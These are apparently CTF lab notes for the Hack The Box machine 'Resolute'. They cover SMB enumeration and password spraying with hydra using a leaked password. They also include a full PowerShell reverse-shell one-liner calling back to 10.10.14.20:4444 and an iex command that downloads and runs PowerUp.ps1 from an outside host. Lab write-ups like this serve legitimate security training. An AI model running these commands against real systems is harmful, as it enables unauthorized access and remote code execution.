# Resolute
## Enumeration

enum4linux gave us some interesting things:
	- Some users
	- A password for marko : Welcome123!

I tried to connect as marko with the password and it was a fail 

So i decide to try with hydra to try every user with the password.
```bash 
hydra -L names.txt -P password.txt 10.10.10.169 smb
```

[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!

so i can connect and enum as melanie with smbclient - smbmap	
```bash
smbmap -u melanie -H 10.10.10.169 -p Welcome123!
smbclient //10.10.10.169/SYSVOL -U melanie -p
```

i used the ruby exploit to connect on port 5985 (WinRm)

reserveshell Oneliner (not usefull here):
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.20",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

usefull privesc tool 
```bash 
iex (New-Object Net.WebClient).DownloadString(‘http://10.10.14.21:8899/PowerUp.ps1’)
```
